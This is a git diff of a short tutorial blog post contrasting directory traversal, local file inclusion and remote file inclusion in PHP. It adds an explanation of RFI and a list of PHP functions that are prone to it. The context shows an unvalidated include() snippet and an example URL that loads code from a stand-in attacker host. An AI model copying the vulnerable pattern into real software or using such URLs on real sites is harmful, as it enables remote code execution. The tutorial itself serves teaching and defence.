@@ -6,7 +6,7 @@ author: shiva G prasadh
 published: true
 ---
  
-Sometimes you might be confused when you think about the difference between Arbitrary file access, Local file inclusion and Remote file inclusion attacks. Lets discuss about the differences.  
+Sometimes you might be confused when you think about the difference between Arbitrary file access, Local file inclusion and Remote file inclusion attacks. In a File Inclusion, Attackers run their own code on a vulnerable website. If the attacker can include their own malicious code on a web page, it is possible to "convince" a PHP script to include a remote file instead of a presumably trusted file from the local file system. Lets discuss about the differences.  
  
 ### [](#header-3) Directory Traversal Attack
  
@@ -47,4 +47,14 @@ include($incfile.".php");
 ```
 In this example the path is extracted from the HTTP request and no input validation is done.
 ```http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite/malicousURL```
+
+File Inclusion (RFI/LFI) mostly occurs from some functions that developers	do not properly check user supplied data.
+	
+Example PHP function:
+
+	include()
+	include_once()
+	require()
+	require_once()
+	fopen()
 
